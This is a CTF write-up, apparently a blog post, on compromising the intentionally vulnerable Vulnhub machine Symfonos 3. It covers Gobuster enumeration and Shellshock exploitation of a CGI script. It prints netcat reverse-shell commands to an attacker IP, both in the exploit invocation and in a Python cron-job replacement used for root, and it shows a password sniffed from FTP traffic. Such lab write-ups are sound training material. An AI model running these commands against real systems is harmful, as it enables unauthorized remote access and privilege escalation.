---
title:     "Vulnhub - Symfonos 3"
tags: [medium,pcap,cron,shellshock]
---

Today, We are going to pwn Symfonos 3 by Zayotic from Vulnhub

## Description:

```
Intermediate real life based machine designed to test your skill at enumeration. If you get stuck remember to try different wordlist, avoid rabbit holes and enumerate everything thoroughly. SHOULD work for both VMware and Virtualbox.

For hints you're welcome to contact me via Twitter @zayotic
```
Download Link : <https://www.vulnhub.com/entry/symfonos-3,332/>

Lets Begin with our Initial Scan

Nmap Scan Results:
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5b
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 cd:64:72:76:80:51:7b:a8:c7:fd:b2:66:fa:b6:98:0c (RSA)
|   256 74:e5:9a:5a:4c:16:90:ca:d8:f7:c7:78:e7:5a:86:81 (ECDSA)
|_  256 3c:e4:0b:b9:db:bf:01:8a:b7:9c:42:bc:cb:1e:41:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:66:C0:36 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## HTTP :

It's an normal webpage with an image.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos3/1.png)

Started my Gobuster to find anything useful.
```
root@w0lf:~# gobuster dir -u http://192.168.1.102/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.1.102/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/03/11 18:35:35 Starting gobuster
===============================================================
/gate (Status: 301)
/server-status (Status: 403)
===============================================================
2020/03/11 18:36:04 Finished
===============================================================
```
``/gate``
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos3/2.png)
So another image like before, started Gobuster again on this page.

```
root@w0lf:~# gobuster dir -u http://192.168.1.102/gate/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.1.102/gate/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/03/11 18:36:38 Starting gobuster
===============================================================
/cerberus (Status: 301)
===============================================================
2020/03/11 18:37:05 Finished
===============================================================
```

``/cerberus``
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos3/3.png)
Again it displays an image, I think we need to keep on digging until we found something interesting.

I used the same wordlist but it found nothing. The creator gave us a hint to try using different wordlist so I switched to another.
```
root@w0lf:~# gobuster dir -u http://192.168.1.102/gate/cerberus/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.1.102/gate/cerberus/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/03/11 18:57:55 Starting gobuster
===============================================================
/index.html (Status: 200)
/tartarus (Status: 301)
===============================================================
2020/03/11 18:57:56 Finished
===============================================================
```

``/tartarus``
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos3/4.png)

I did curl on this website and found an message.<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos3/5.png)

So Its an Rabbit Hole. 

```
root@w0lf:~# gobuster dir -u http://192.168.1.102/gate/cerberus/tartarus/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.1.102/gate/cerberus/tartarus/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/03/11 18:59:13 Starting gobuster
===============================================================
/research (Status: 200)
/hermes (Status: 301)
/charon (Status: 301)
===============================================================
2020/03/11 18:59:42 Finished
===============================================================
```
After this I can't view the pages.

I started Gobuster again with different wordlist from the first.
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.1.102
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/03/11 19:13:52 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/cgi-bin/ (Status: 403)
/gate (Status: 301)
/server-status (Status: 403)
===============================================================
2020/03/11 19:13:55 Finished
===============================================================
```

Now we got new directory ``/cgi-bin/`` Started Gobuster on this directory.
```
root@w0lf:~# gobuster dir -u http://192.168.1.102/cgi-bin/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.1.102/cgi-bin/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/03/11 19:14:50 Starting gobuster
===============================================================
/underworld (Status: 200)
===============================================================
2020/03/11 19:15:20 Finished
===============================================================
```
Now we found ``/underworld`` Let's check whats there.
The website is doing ``uptime`` command.

>uptime - Tell how long the system has been running.

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos3/6.png)

We can use that on our machine too by typing ``uptime``
```
root@w0lf:~/CTF/Vulnhub/Symfonos3# uptime
 19:20:48 up 54 min,  1 user,  load average: 0.56, 0.69, 0.62
```
So this might be a ShellShock Vulnerability.

>/cgi-bin is a folder used to house scripts that will interact with a Web browser to provide functionality for a Web page or website.

Reference:
>https://null-byte.wonderhowto.com/how-to/exploit-shellshock-web-server-using-metasploit-0186084/

## Method 1 (Metasploit):

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos3/7.png)

> - Changed TARGETURI /cgi-bin/underworld/
> - Changed RHOST 192.168.1.102

We will get user ``cerberus`` shell.

## Method 2 :

Searched ``shellshock`` in Searchsploit and it displays some exploits. I choosed [BASH](https://www.exploit-db.com/exploits/34766)
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos3/8.png)

According to the example

>php 34766.php -u http://192.168.1.102/cgi-bin/underworld/ -c "nc -e /bin/bash 192.168.1.103 1234"

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos3/9.png)

Got ``cerberus`` shell.

Uploaded my Linux Enumeration Script but didn't found anything useful. So uploaded my ``Pspy`` to see anything running on the background.


>pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.

There is a python script running on the background ``ftpclient.py`` sending some data to ftp. We don't have permission to view the python script. Since ``ftp`` is Plain text we can capture those packets and view them in wireshark.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos3/10.png)

We can use ``tcpdump``

>tcpdump - dump traffic on a network

```
cerberus@symfonos3:/tmp$ tcpdump -D
1.enp0s17 [Up, Running]
2.any (Pseudo-device that captures on all interfaces) [Up, Running]
3.lo [Up, Running, Loopback]
4.nflog (Linux netfilter log (NFLOG) interface)
5.nfqueue (Linux netfilter queue (NFQUEUE) interface)
6.usbmon1 (USB bus number 1)
```
>-D 	Print the list of the network interfaces available on the system and on which tcp‐dump  can  capture packets.

```
$ tcpdump -i lo -w tcp.pcap
tcpdump -i lo -w tcp.pcap
tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
```
> - -w 
> - -i Listen on interface

Run this for few moment. And Started Python server in the machine and downloaded the ``ftp.pcap`` to my machine.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos3/11.png)

I used Wireshark to see whats there and found User ``Hades`` Password.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos3/12.png)

Logged in SSH with ``hades:PTpZTfU4vxgzvRBE``<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos3/13.1.png)

## Privilege Escalation:

We know the python script is in ``/opt/ftpclient`` and now we have permission to write on the script.

Removed that old script and I created a reverse shell python script in my machine and uploaded it to the machine.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos3/13.png)

```
import sys
import os
os.system("nc -e /bin/bash 192.168.1.103 1234")
```

Started my NC listener and wait for sometime and BOOM I'm root!!<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos3/14.png)